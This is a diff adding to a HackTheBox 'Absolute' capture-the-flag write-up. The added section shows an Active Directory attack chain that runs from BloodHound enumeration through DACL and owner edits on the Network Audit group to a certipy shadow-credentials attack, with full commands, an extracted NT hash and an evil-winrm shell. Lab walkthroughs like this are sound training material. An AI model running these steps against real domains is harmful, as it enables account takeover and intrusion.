@@ -274,7 +274,166 @@ I didn't do that.
 
 ### CME to Verify it
 ```bash
-faketime '2023-11-20 22:34:00' crackmapexec smb $IP -u m.lovegod -p 'AbsoluteLDAP2022!' -k
+faketime '2023-11-21 00:28:00' crackmapexec smb $IP -u m.lovegod -p 'AbsoluteLDAP2022!' -k
 SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
 SMB         10.129.229.59   445    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022!
+```
+
+# Auth as winrm_user
+### Bloodhound
+```bash
+faketime '2023-11-21 00:34:00' bloodhound-python -u m.lovegod -p 'AbsoluteLDAP2022!' -d absolute.htb -dc dc.absolute.htb -ns $IP
+
+faketime '2023-11-21 19:42:00' bloodhound-python -u m.lovegod -p 'AbsoluteLDAP2022!' -k -d absolute.htb -dc dc.absolute.htb -ns $IP --zip -c All
+```
+
+`bloodhound.py -u m.lovegod -k -d absolute.htb -dc dc.absolute.htb -ns $IP --dns-tcp --zip -c All -no-pass`
+
+`-c All` is important, always using that. `-no-pass` not working for some reasons.
+
+If you encounter DNS issues, you can try using `dnschef` and point the nameserver option on BloodHound to your local machine.
+
+After setup, On the top left, we search for the user `m.lovegod` and right click on the user's node, marking it as owned. We can do the same for the other users.
+
+Looking at the Analysis tab we can see some common predefined queries that we can execute to find interesting and potentially exploitable properties and relations. In this case, however, we find valuable information by looking at the Transitive Object
+Control attribute of the `m.lovegod` user node.
+
+* https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
+
+It seems like the user `m.lovegod` owns the `NETWORK_AUDIT` group, which in turn has `GenericWrite` on `winrm_user`, who is a member of the `REMOTE MANAGEMENT USERS` group. This means that if we manage to work our way to the `winrm_user` user, we can use WinRM and gain access to the machine. One way to do this is to add m.lovegod to the `NETWORK AUDIT` group and then perform a Shadow Credentials Attack on winrm_user . This will work because m.lovegod has the GenericWrite permission over the account, provided that Active Directory Certificate Services ( ADCS ) is installed.
+
+### Shadow Credentials Attack on winrm_user
+To get access to winrm_user, I’ll first I’ll need to give m.lovegod write access on the Network Audit group. Then I can add m.lovegod to the group. Finally, I can use those permissions to create a shadow credential for the winrm_user account.
+
+The first two steps are much easier to do on Windows (and Bloodhound tells you the commands to run). I’ll show both Windows and Linux.
+
+The “Shadow Credential” technique involves manipulating the user’s msDS-KeyCredentialLink attribute, which binds a credential to their account that I can then use to authenticate. This technique is much less disruptive than just changing the user’s password. This post from Spector Ops has a ton of good detail.
+
+##### Step 1: Give m.lovegod write access on the Network Audit group
+Two ways to explore. I'm gonna go with the official one. Both are essentially same.
+
+* https://github.com/fortra/impacket/pull/1323
+* https://0xdf.gitlab.io/2023/05/27/htb-absolute.html#add-mlovegod-to-network-audit
+
+```bash
+faketime '2023-11-21 22:34:00' python owneredit.py -k -no-pass absolute.htb/m.lovegod -dc-ip dc.absolute.htb -new-owner m.lovegod -target 'Network Audit' -action write
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Current owner information below
+[*] - SID: S-1-5-21-4078382237-1492182817-2568127209-1109
+[*] - sAMAccountName: m.lovegod
+[*] - distinguishedName: CN=m.lovegod,CN=Users,DC=absolute,DC=htb
+[*] OwnerSid modified successfully!
+```
+
+##### Step 2: use dacledit.py (another pull request)
+Impacket dacledit, which will allow us to give full control of the Network Audit group to the user m.lovegod 
+
+* https://github.com/fortra/impacket/pull/1291
+
+I just copied two files and updated a little instead of get the whole repo.
+
+```python
+# from impacket.msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
+from msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
+```
+
+Adding the module search path if it needed when you put them to other directories.
+
+```python
+import sys
+sys.path.insert(0, '')
+```
+
+```bash
+faketime '2023-11-21 22:50:00' python dacledit.py -k -no-pass absolute.htb/m.lovegod -dc-ip dc.absolute.htb -principal m.lovegod -target "Network Audit" -action write -rights FullControl
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] DACL backed up to dacledit-20231121-202104.bak
+[*] DACL modified successfully!
+```
+
+##### Step 3: Add user `m.lovegod` to the groups `Network Audit`
+This step is so annonying. * https://youtu.be/rfAmMQV_wss?feature=shared&t=3871
+
+You have to keep a great `krb5.conf` And run all these 3 steps very fast, otherwise the cleanup script will remove all of it.
+
+`nameserver 10.129.229.59`
+
+```bash
+[libdefaults]
+        default_realm = ABSOLUTE.HTB
+
+        kdc_timesync = 1
+        ccache_type = 4
+        forwardable = true
+        proxiable = true
+        fcc-mit-ticketflags = true
+
+[realms]
+        ABSOLUTE.HTB = {
+                kdc = dc.absolute.htb
+                admin_server = dc.absolute.htb
+                default_domain = absolute.htb
+        }
+
+[domain_realm]
+        .absolute.htb = ABSOLUTE.HTB
+        absolute.htb = ABSOLUTE.HTB
+        ```
+```bash
+faketime '2023-11-21 22:49:00' net rpc group addmem "Network Audit" m.lovegod -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb
+Password for [WORKGROUP\m.lovegod]:
+
+faketime '2023-11-21 22:35:00' net rpc group members "Network Audit" -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb
+Password for [WORKGROUP\m.lovegod]:
+absolute\m.lovegod
+absolute\svc_audit
+
+Or ldap to search if the user was added successfully  
+ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "cn=m.lovegod,cn=users,dc=absolute,dc=htb"
+```
+
+##### Step 4: shadow cred attack
+```bash
+faketime '2023-11-21 22:53:00' certipy find -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip $IP -target dc.absolute.htb
+
+faketime '2023-11-21 22:55:00' certipy shadow auto -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip $IP -target dc.absolute.htb -account winrm_user
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'winrm_user'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '7cf7db08-04a1-37f4-c9be-3693bc7ea117'
+[*] Adding Key Credential with device ID '7cf7db08-04a1-37f4-c9be-3693bc7ea117' to the Key Credentials for 'winrm_user'
+[*] Successfully added Key Credential with device ID '7cf7db08-04a1-37f4-c9be-3693bc7ea117' to the Key Credentials for 'winrm_user'
+[*] Authenticating as 'winrm_user' with the certificate
+[*] Using principal: winrm_user@absolute.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'winrm_user.ccache'
+[*] Trying to retrieve NT hash for 'winrm_user'
+[*] Restoring the old Key Credentials for 'winrm_user'
+[*] Successfully restored the old Key Credentials for 'winrm_user'
+[*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2
+```
+
+Note: If you encounter problems at this stage, first of all verify that the user `m.lovegod` is still part of the Network Audit group using ldapsearch and after you verify that, ask for a new TGT for the user m.lovegod using the getTGT script.
+
+I indeed encountered the issue, so I ran `kinit m.lovegod` again
+
+```bash
+faketime '2023-11-21 23:03:00' evil-winrm -i dc.absolute.htb -u winrm_user -r ABSOLUTE.HTB
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: User is not needed for Kerberos auth. Ticket will be used
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\winrm_user\Documents>
 ```
